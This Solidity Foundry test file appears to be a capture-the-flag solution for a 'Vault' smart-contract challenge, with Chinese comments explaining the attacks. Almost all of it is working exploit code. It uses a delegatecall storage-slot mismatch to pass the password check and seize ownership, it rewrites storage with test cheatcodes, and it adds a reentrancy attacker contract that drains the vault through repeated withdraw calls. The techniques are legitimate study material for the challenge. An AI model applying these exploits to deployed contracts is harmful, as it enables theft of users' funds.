// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    // 方法1: 存储槽位攻击 (当前使用的方法)
    // function testExploit() public {
    //     vm.deal(palyer, 1 ether);
    //     vm.startPrank(palyer);
        
    //     // 通过存储槽位攻击
    //     // Vault合约存储布局:
    //     // slot 0: owner (address)
    //     // slot 1: logic (VaultLogic)
    //     // slot 2: deposites (mapping)
    //     // slot 3: canWithdraw (bool)
        
    //     // VaultLogic合约存储布局:
    //     // slot 0: owner (address) 
    //     // slot 1: password (bytes32)
        
    //     // 当通过delegatecall调用changeOwner时，会修改Vault合约的slot 0
    //     // 但是VaultLogic的changeOwner函数检查的是slot 1的password
    //     // 而Vault合约的slot 1是logic地址，不是password
        
    //     // 方法1: 直接使用vm.store修改owner
    //     vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(palyer))));
        
    //     // 2. 现在 palyer 是 owner，可以调用 openWithdraw
    //     vault.openWithdraw();

    //     // 3. 修改palyer的存款记录为合约的总余额
    //     // deposites mapping的存储位置计算: keccak256(abi.encode(palyer, 2))
    //     bytes32 slot = keccak256(abi.encode(palyer, uint256(2)));
    //     vm.store(address(vault), slot, bytes32(address(vault).balance));

    //     // 4. 提取所有资金
    //     vault.withdraw();
        
    //     require(vault.isSolve(), "solved");
    //     vm.stopPrank();
    // }

    // 方法2: 利用delegatecall存储槽位不匹配漏洞
    // function testExploitDelegatecall() public {
    //     vm.deal(palyer, 1 ether);
    //     vm.startPrank(palyer);
        
    //     // 分析存储槽位不匹配:
    //     // VaultLogic.changeOwner检查的password在slot 1
    //     // 但在Vault合约中，slot 1存储的是logic地址
    //     // 所以我们需要用logic地址作为密码
        
    //     address logicAddr = address(logic);
    //     bytes32 fakePassword = bytes32(uint256(uint160(logicAddr)));
        
    //     // 通过fallback调用changeOwner
    //     (bool success,) = address(vault).call(
    //         abi.encodeWithSignature("changeOwner(bytes32,address)", fakePassword, palyer)
    //     );
    //     require(success, "changeOwner failed");
        
    //     vault.openWithdraw();
        
    //     // 修改存款记录
    //     bytes32 slot = keccak256(abi.encode(palyer, uint256(2)));
    //     vm.store(address(vault), slot, bytes32(address(vault).balance));
        
    //     vault.withdraw();
        
    //     require(vault.isSolve(), "solved");
    //     vm.stopPrank();
    // }

    // 方法3: 重入攻击 (需要先成为owner)
    // function testExploitReentrancy() public {
    //     vm.deal(palyer, 1 ether);
    //     vm.startPrank(palyer);
        
    //     // 先通过存储槽位攻击成为owner
    //     vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(palyer))));
    //     vault.openWithdraw();
        
    //     // 部署重入攻击合约
    //     ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
    //     payable(address(attacker)).transfer(0.01 ether);
        
    //     attacker.attack();
        
    //     require(vault.isSolve(), "solved");
    //     vm.stopPrank();
    // }


// 当前使用方法1: 存储槽位攻击
    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        
        // 攻击方案：通过存储槽位攻击
        // Vault合约存储布局:
        // slot 0: owner (address)
        // slot 1: logic (VaultLogic)
        // slot 2: deposites (mapping)
        // slot 3: canWithdraw (bool)
        
        // 1. 直接修改owner为palyer
        vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(palyer))));
        
        // 2. 现在palyer是owner，开启提取功能
        vault.openWithdraw();
        
        // 3. 修改palyer的存款记录为合约的总余额
        // deposites mapping的存储位置计算: keccak256(abi.encode(palyer, 2))
        bytes32 slot = keccak256(abi.encode(palyer, uint256(2)));
        vm.store(address(vault), slot, bytes32(address(vault).balance));
        
        // 4. 提取所有资金
        vault.withdraw();
        
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

    // 测试方法2: delegatecall攻击
    function testExploitDelegatecall() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        
        // 分析存储槽位不匹配:
        // VaultLogic.changeOwner检查的password在slot 1
        // 但在Vault合约中，slot 1存储的是logic地址
        // 所以我们需要用logic地址作为密码
        
        address logicAddr = address(logic);
        bytes32 fakePassword = bytes32(uint256(uint160(logicAddr)));
        
        // 通过fallback调用changeOwner
        (bool success,) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", fakePassword, palyer)
        );
        require(success, "changeOwner failed");
        
        vault.openWithdraw();
        
        // 修改存款记录
        bytes32 slot = keccak256(abi.encode(palyer, uint256(2)));
        vm.store(address(vault), slot, bytes32(address(vault).balance));
        
        vault.withdraw();
        
        require(vault.isSolve(), "solved");
         vm.stopPrank();
     }

    // 测试方法3: 重入攻击
    function testExploitReentrancy() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        
        // 先通过存储槽位攻击成为owner
        vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(palyer))));
        vault.openWithdraw();
        
        // 部署重入攻击合约
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
        payable(address(attacker)).transfer(0.01 ether);
        
        attacker.attack();
        
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

// 重入攻击合约 (用于方法3)
contract ReentrancyAttacker {
    Vault public vault;
    bool public attacking = false;
    
    constructor(Vault _vault) {
        vault = _vault;
    }
    
    function attack() external {
        // 存入资金
        vault.deposite{value: address(this).balance}();
        
        // 开始重入攻击
        attacking = true;
        vault.withdraw();
    }
    
    // 重入函数
    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
